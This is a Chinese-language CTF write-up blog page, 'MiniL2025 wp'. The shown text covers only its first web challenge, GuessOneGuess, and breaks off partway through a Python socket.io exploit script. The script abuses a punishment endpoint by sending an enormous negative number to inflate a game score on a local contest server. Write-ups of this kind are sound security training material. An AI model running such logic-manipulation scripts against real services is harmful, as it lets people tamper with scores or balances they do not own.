<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="WebGuessOneGuess给了源码，后端是nodejs写的，打开页面是个猜数字游戏，靠猜数字达到一定分数就有东西，但是肯定没这么简单出flag，因为要达到的分数是JavaScript能表示的最大数值：  但发现有个&#x2F;punishment-response端点，就是猜错100次后会接收客户端发送的数字在总分中扣除这个数字，果断想到可以发送一个极大的负数，使得扣分变成加分，分数就可以变成想要的最">
<meta property="og:type" content="article">
<meta property="og:title" content="MiniL2025 wp">
<meta property="og:url" content="https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/index.html">
<meta property="og:site_name" content="海蘑菇的自留地">
<meta property="og:description" content="WebGuessOneGuess给了源码，后端是nodejs写的，打开页面是个猜数字游戏，靠猜数字达到一定分数就有东西，但是肯定没这么简单出flag，因为要达到的分数是JavaScript能表示的最大数值：  但发现有个&#x2F;punishment-response端点，就是猜错100次后会接收客户端发送的数字在总分中扣除这个数字，果断想到可以发送一个极大的负数，使得扣分变成加分，分数就可以变成想要的最">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140915162.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140925996.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831645.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140937183.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831582.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831589.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833011.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140951180.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833099.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141001144.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833538.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834087.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509142153207.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834487.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834913.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834997.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141023378.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141029000.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140836252.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141041499.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140836760.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141052419.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140838333.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141104016.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141109753.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839540.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141121512.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839588.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839932.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140840028.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141153242.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141137143.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140841677.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152139702.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116746.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152155429.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116734.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116735.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152514426.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152207831.png">
<meta property="article:published_time" content="2025-05-09T06:22:20.000Z">
<meta property="article:modified_time" content="2025-05-09T07:25:58.079Z">
<meta property="article:author" content="anch0r">
<meta property="article:tag" content="miniLCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140915162.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>MiniL2025 wp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
  <!-- Waline Comments -->
  
    <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/>
  
<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/04/09/%E4%B8%80%E4%B8%AA%E9%92%88%E5%AF%B9Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&text=MiniL2025 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&is_video=false&description=MiniL2025 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=MiniL2025 wp&body=Check out this article: https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&name=MiniL2025 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&t=MiniL2025 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessOneGuess"><span class="toc-number">1.1.</span> <span class="toc-text">GuessOneGuess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Miniup"><span class="toc-number">1.2.</span> <span class="toc-text">Miniup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Click-and-click"><span class="toc-number">1.3.</span> <span class="toc-text">Click and click</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezCC"><span class="toc-number">1.4.</span> <span class="toc-text">ezCC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHessian"><span class="toc-number">1.5.</span> <span class="toc-text">ezHessian</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pybox"><span class="toc-number">1.6.</span> <span class="toc-text">pybox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%81%93%E5%9D%8E%EF%BC%9Abadchars"><span class="toc-number">1.6.1.</span> <span class="toc-text">第一道坎：badchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%81%93%E5%9D%8E%EF%BC%9A%E7%BB%95%E8%BF%87%E9%92%A9%E5%AD%90%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">第二道坎：绕过钩子检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%81%93%E5%9D%8E%EF%BC%9A%E9%80%83%E9%80%B8%E5%87%BA%E5%8E%BB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.6.3.</span> <span class="toc-text">第三道坎：逃逸出去命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%81%93%E5%9D%8E%EF%BC%9A-find%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.4.</span> <span class="toc-text">第四道坎： find提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%81%93%E5%9D%8E%EF%BC%9Aflag%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%85%A8"><span class="toc-number">1.6.5.</span> <span class="toc-text">第五道坎：flag读取不全</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%83%E8%B1%86%E4%BA%BA"><span class="toc-number">2.1.</span> <span class="toc-text">吃豆人</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BA%A6%E9%9C%B8%E8%AF%84%E5%88%86"><span class="toc-number">2.2.</span> <span class="toc-text">麦霸评分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MiniForensics%E2%85%A0"><span class="toc-number">2.3.</span> <span class="toc-text">MiniForensicsⅠ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-Miniforensic-II"><span class="toc-number">2.4.</span> <span class="toc-text">MISC-Miniforensic II</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        MiniL2025 wp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">anch0r</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-05-09T06:22:20.000Z" class="dt-published" itemprop="datePublished">2025-05-09</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/ctf/">ctf</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/miniLCTF/" rel="tag">miniLCTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GuessOneGuess"><a href="#GuessOneGuess" class="headerlink" title="GuessOneGuess"></a>GuessOneGuess</h2><p>给了源码，后端是nodejs写的，打开页面是个猜数字游戏，靠猜数字达到一定分数就有东西，但是肯定没这么简单出flag，因为要达到的分数是JavaScript能表示的最大数值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140915162.png" alt="image-20250508104403907"></p>
<p>但发现有个/punishment-response端点，就是猜错100次后会接收客户端发送的数字在总分中扣除这个数字，果断想到可以发送一个极大的负数，使得扣分变成加分，分数就可以变成想要的最大数值。</p>
<p>python脚本：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socketio</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">SERVER_URL = <span class="string">"http://127.0.0.1:51610/"</span></span><br><span class="line">WS_PATH = <span class="string">"socket.io/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sio = socketio.AsyncClient(logger=<span class="literal">True</span>, engineio_logger=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">incorrect_guesses_count = <span class="number">0</span></span><br><span class="line">score_manipulated = <span class="literal">False</span></span><br><span class="line">flag_received = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">min_val = <span class="number">1</span></span><br><span class="line">max_val = <span class="number">100</span></span><br><span class="line">current_guess = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@sio.event</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] Connected to server."</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Starting phase 1: Triggering punishment (100 incorrect guesses)..."</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Sending initial guess (guess #1)..."</span>)</span><br><span class="line">    <span class="keyword">await</span> sio.emit(<span class="string">"guess"</span>, {<span class="string">"value"</span>: <span class="string">"1"</span>})</span><br><span class="line"></span><br><span class="line"><span class="meta">@sio.event</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">disconnect</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[-] Disconnected from server."</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@sio.on(<span class="params"><span class="string">'game-message'</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">game_message</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"here"</span>)</span><br><span class="line">    <span class="keyword">global</span> incorrect_guesses_count, score_manipulated, flag_received</span><br><span class="line">    <span class="keyword">global</span> min_val, max_val, current_guess</span><br><span class="line"></span><br><span class="line">    message_type = data.get(<span class="string">"type"</span>)</span><br><span class="line">    message = data.get(<span class="string">"message"</span>, <span class="string">""</span>)</span><br><span class="line">    score = data.get(<span class="string">"score"</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[RECV] Type: <span class="subst">{message_type}</span>, Win: <span class="subst">{data.get(<span class="string">'win'</span>, <span class="string">'N/A'</span>)}</span>, Message: <span class="subst">{message}</span>, Score: <span class="subst">{score}</span>"</span>) </span><br><span class="line">    <span class="keyword">if</span> flag_received:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message_type == <span class="string">"welcome"</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[*] Welcome message received: <span class="subst">{message}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> message_type == <span class="string">"result"</span>:</span><br><span class="line">        win = data.get(<span class="string">"win"</span>, <span class="literal">False</span>)</span><br><span class="line">        show_flag = data.get(<span class="string">"showFlag"</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> win:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[+] Correct guess! Message: <span class="subst">{message}</span>, Score: <span class="subst">{score}</span>"</span>)</span><br><span class="line">            <span class="keyword">if</span> show_flag:</span><br><span class="line">                flag = message.split(<span class="string">"\n"</span>)[-<span class="number">1</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\n"</span> + <span class="string">"="</span>*<span class="number">40</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[*] FLAG FOUND: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"="</span>*<span class="number">40</span> + <span class="string">"\n"</span>)</span><br><span class="line">                flag_received = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">await</span> sio.disconnect()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[*] Score manipulated successfully. Starting phase 3: Binary search for the flag..."</span>)</span><br><span class="line">                min_val = <span class="number">1</span></span><br><span class="line">                max_val = <span class="number">100</span></span><br><span class="line">                current_guess = (min_val + max_val) // <span class="number">2</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[*] Binary Search: Guessing <span class="subst">{current_guess}</span>"</span>)</span><br><span class="line">                <span class="keyword">await</span> sio.emit(<span class="string">"guess"</span>, {<span class="string">"value"</span>: <span class="built_in">str</span>(current_guess)})</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># Incorrect guess</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[*] Handling incorrect guess result (win=False). Current incorrect count: <span class="subst">{incorrect_guesses_count}</span>"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> score_manipulated:</span><br><span class="line">                incorrect_guesses_count += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[*] Incorrect guess count incremented to: <span class="subst">{incorrect_guesses_count}</span>"</span>)</span><br><span class="line">                <span class="keyword">if</span> incorrect_guesses_count &lt; <span class="number">100</span>:</span><br><span class="line">                    <span class="comment"># Send another incorrect guess</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"[*] Sending guess #<span class="subst">{incorrect_guesses_count + <span class="number">1</span>}</span> (value: 1)..."</span>)</span><br><span class="line">                    <span class="keyword">await</span> sio.emit(<span class="string">"guess"</span>, {<span class="string">"value"</span>: <span class="string">"1"</span>})</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"[*] Guess #<span class="subst">{incorrect_guesses_count + <span class="number">1</span>}</span> sent."</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"[*] Reached <span class="subst">{incorrect_guesses_count}</span> incorrect guesses. Waiting for punishment event..."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[*] Binary Search: Feedback: <span class="subst">{message}</span>"</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"太小了"</span> <span class="keyword">in</span> message:</span><br><span class="line">                    min_val = current_guess + <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"太大了"</span> <span class="keyword">in</span> message:</span><br><span class="line">                    max_val = current_guess - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"[!] Unexpected feedback during binary search."</span>)</span><br><span class="line">                    <span class="keyword">await</span> sio.disconnect()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> min_val &gt; max_val:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"[!] Binary search failed (min &gt; max). Something is wrong."</span>)</span><br><span class="line">                    <span class="keyword">await</span> sio.disconnect()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                current_guess = (min_val + max_val) // <span class="number">2</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[*] Binary Search: Guessing <span class="subst">{current_guess}</span> (Range: <span class="subst">{min_val}</span>-<span class="subst">{max_val}</span>)"</span>)</span><br><span class="line">                <span class="keyword">await</span> sio.emit(<span class="string">"guess"</span>, {<span class="string">"value"</span>: <span class="built_in">str</span>(current_guess)})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> message_type == <span class="string">"error"</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] Server Error: <span class="subst">{message}</span>"</span>)</span><br><span class="line">        <span class="keyword">await</span> sio.disconnect()</span><br><span class="line"></span><br><span class="line"><span class="meta">@sio.event</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">punishment</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">global</span> score_manipulated</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Received punishment event. Sending large negative score..."</span>)</span><br><span class="line">    large_negative_score = <span class="string">"-2e308"</span></span><br><span class="line">    <span class="keyword">await</span> sio.emit(<span class="string">"punishment-response"</span>, {<span class="string">"score"</span>: large_negative_score})</span><br><span class="line">    score_manipulated = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[*] Sent punishment response with score: <span class="subst">{large_negative_score}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> flag_received</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[*] Attempting to connect to <span class="subst">{SERVER_URL}</span>..."</span>)</span><br><span class="line">        <span class="keyword">await</span> sio.connect(SERVER_URL, socketio_path=WS_PATH)</span><br><span class="line">        <span class="keyword">await</span> sio.wait()</span><br><span class="line">    <span class="keyword">except</span> socketio.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] Connection failed: <span class="subst">{e}</span>"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] Please ensure the server is running and the SERVER_URL is correct."</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] An unexpected error occurred: <span class="subst">{e}</span>"</span>)</span><br><span class="line">   